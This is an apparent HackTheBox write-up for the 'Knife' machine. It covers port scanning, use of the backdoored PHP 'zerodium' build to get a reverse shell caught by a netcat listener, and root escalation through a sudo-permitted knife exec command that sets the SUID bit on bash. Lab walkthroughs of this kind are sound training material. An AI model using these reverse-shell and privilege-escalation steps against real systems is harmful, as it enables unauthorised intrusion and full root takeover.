Knife is an easy rated machine on HackTheBox by [MrKN16H](https://www.hackthebox.eu/home/users/profile/98767). For the user part we will abuse a backdoored php version and for root sudo rights on the `Chef Workstation` binary `knife`.

# User

## Nmap

As usual we start our enumeration off with an nmap scan against all ports, followed by a script and version detection scan against the open ones.

`All ports`
```
$ sudo nmap -p- -T4  10.129.136.243
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 20:09 UTC
Nmap scan report for knife.htb (10.129.136.243)
Host is up (0.034s latency).
Not shown: 65526 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http

Nmap done: 1 IP address (1 host up) scanned in 1311.09 seconds
```

`Script and version`
```
$ sudo nmap -sC -sV -p 22,80 10.129.136.243

## Php Zerodium

Looking at a request in burp we can see that the the server is powered by php. Checking for the recent [php backdoor](https://www.bleepingcomputer.com/news/security/phps-git-server-hacked-to-add-backdoors-to-php-source-code/) we can see that it is indeed present on this system.

[![zerodium_poc](/img/knife/zerodium_poc.png)](/img/knife/zerodium_poc.png)

Having code execution on the server we can send a revershell in the next step. First we set up a listener.

```
$ nc -lnvp 7575
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

Afterwards we send the revershell and upgrade it.

[![zerodium_revshell](/img/knife/zerodium_revshell.png)](/img/knife/zerodium_revshell.png)

```
$ nc -lnvp 7575
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
Ncat: Connection from 10.129.136.243.
Ncat: Connection from 10.129.136.243:43786.
bash: cannot set terminal process group (884): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
james@knife:/$ export TERM=xterm
export TERM=xterm
james@knife:/$ ^Z
[1]+  Stopped                 nc -lnvp 7575
$ stty raw -echo;fg
nc -lnvp 7575

james@knife:/$
```

We can now read the user flag.

```
$ wc -c /home/james/user.txt
33 /home/james/user.txt
```

# Root

## Chef workstation

On a first glance, we can see that the user james can run the command knife as root.

```
james@knife:/$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
james@knife:/$
```

This belongs to [chef-workstation](https://downloads.chef.io/tools/workstation), a remote management tool.

```
$ ls -la /usr/bin/knife
lrwxrwxrwx 1 root root 31 May  7 11:03 /usr/bin/knife -> /opt/chef-workstation/bin/knife
```

With this we can execute commands as the root user on the system and get to root easily by setting the suid bit on `bash`.

```
james@knife:~$ sudo /usr/bin/knife exec -E 'exec "chmod +s /bin/bash"'; bash -p
bash-5.0# wc -c /root/root.txt
33 /root/root.txt
```
